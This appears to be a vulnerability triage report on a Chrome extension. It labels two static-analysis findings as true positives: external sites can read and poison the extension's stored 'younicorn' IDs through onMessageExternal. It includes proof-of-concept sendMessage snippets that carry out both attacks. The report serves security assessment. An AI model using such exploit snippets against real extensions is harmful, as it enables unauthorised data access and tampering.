# CoCo Analysis: ghdnfbmfflgelndafnlgabneckbmfpla

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8 (multiple variants of the same 2 vulnerability patterns)

---

## Sink 1: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ghdnfbmfflgelndafnlgabneckbmfpla/opgen_generated_files/bg.js
Line 751: var storage_local_get_source = {'key': 'value'};
Line 974: console.log('Value currently is ' + result.younicorns);

**Code:**

```javascript
// Background script (bg.js) - Extension initialization
const siteData = {
    younicorns: []
};

// Load younicorns from storage on startup (line 973-979)
chrome.storage.local.get(['younicorns'], function(result) {
    console.log('Value currently is ' + result.younicorns);
    if(result.younicorns) {
        siteData.younicorns = result.younicorns; // ← Storage data loaded
    };
});

// External message handler (line 1087-1115)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    console.log('onMessageExternal', request, sender, sendResponse);

    if(request.type === 'installed') {
        sendResponse({
            installed: true
        });
    } else if(request.type === 'getYounicorns') {
        sendResponse({
            younicorns: siteData.younicorns // ← Storage data sent back to attacker
        });
    } else if(request.type === 'addYounicorn') {
        if(request.younicornId) {
            addYounicorn(request.younicornId);
            sendResponse({
                younicorns: siteData.younicorns
            });
        }
    } else if(request.type === 'removeYounicorn') {
        if(request.younicornId) {
            removeYounicorn(request.younicornId);
            sendResponse({
                younicorns: siteData.younicorns
            });
        }
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain (localhost/* or *.cornify.com/*)
// Attack 1: Read stored younicorns data
chrome.runtime.sendMessage('ghdnfbmfflgelndafnlgabneckbmfpla',
    { type: 'getYounicorns' },
    function(response) {
        console.log('Leaked younicorns:', response.younicorns);
    }
);
```

**Impact:** Information disclosure - external websites matching externally_connectable patterns (localhost and *.cornify.com) can retrieve all stored younicorn IDs. According to methodology, we ignore manifest.json externally_connectable restrictions - if even ONE domain can exploit this, it's a TRUE POSITIVE.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ghdnfbmfflgelndafnlgabneckbmfpla/opgen_generated_files/bg.js
Line 1099: if(request.younicornId)

**Code:**

```javascript
// External message handler (line 1087-1115)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if(request.type === 'addYounicorn') {
        if(request.younicornId) {
            addYounicorn(request.younicornId); // ← Attacker-controlled data
            sendResponse({
                younicorns: siteData.younicorns
            });
        }
    } else if(request.type === 'removeYounicorn') {
        if(request.younicornId) {
            removeYounicorn(request.younicornId); // ← Attacker-controlled data
            sendResponse({
                younicorns: siteData.younicorns
            });
        }
    }
});

// Storage write function (line 1027-1034)
function addYounicorn(younicornId) {
    const index = siteData.younicorns.indexOf(younicornId);
    if(index === -1) {
        siteData.younicorns.push(younicornId); // ← Attacker data added
        saveYounicorns(); // ← Saved to storage
    }
};

function saveYounicorns() {
    chrome.storage.local.set({
        younicorns: siteData.younicorns // ← Attacker data persisted
    }, function() {
        console.log('Younicorns saved', siteData.younicorns);
    });
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain (localhost/* or *.cornify.com/*)
// Attack 2: Poison storage with arbitrary younicorn IDs
chrome.runtime.sendMessage('ghdnfbmfflgelndafnlgabneckbmfpla',
    { type: 'addYounicorn', younicornId: 'malicious_id_12345' },
    function(response) {
        console.log('Successfully poisoned storage:', response.younicorns);
    }
);

// Attack 3: Complete exploitation chain - write and read back
chrome.runtime.sendMessage('ghdnfbmfflgelndafnlgabneckbmfpla',
    { type: 'addYounicorn', younicornId: 'attacker_data' },
    function(response) {
        // Immediately receive back the poisoned data
        console.log('Stored and retrieved:', response.younicorns);
    }
);
```

**Impact:** Complete storage exploitation chain - external websites can both poison the extension's storage with arbitrary younicorn IDs AND retrieve the stored data. This allows persistent storage manipulation and information disclosure. The sendResponse in the handler provides immediate feedback of the poisoned data, completing the exploitation chain.
